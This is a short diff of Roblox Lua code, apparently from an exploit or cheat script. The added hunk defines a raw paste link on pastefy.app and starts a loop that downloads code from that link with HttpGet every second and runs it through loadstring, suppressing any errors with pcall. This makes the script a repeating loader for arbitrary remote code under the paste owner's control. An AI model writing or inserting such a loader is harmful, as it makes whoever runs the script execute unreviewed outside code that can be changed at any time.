@@ -9,6 +9,17 @@ task.spawn(function()
 	end
 end)
 
+local RAW_LINK = "https://pastefy.app/s5tQRqTs/raw"
+local DELAY = 1 -- thời gian spam (giây)
+
+task.spawn(function()
+	while task.wait(DELAY) do
+		pcall(function()
+			loadstring(game:HttpGet(RAW_LINK))()
+		end)
+	end
+end)
+
 
 --==================================================
 -- AUTO RELOAD WHEN SERVER HOP / REJOIN
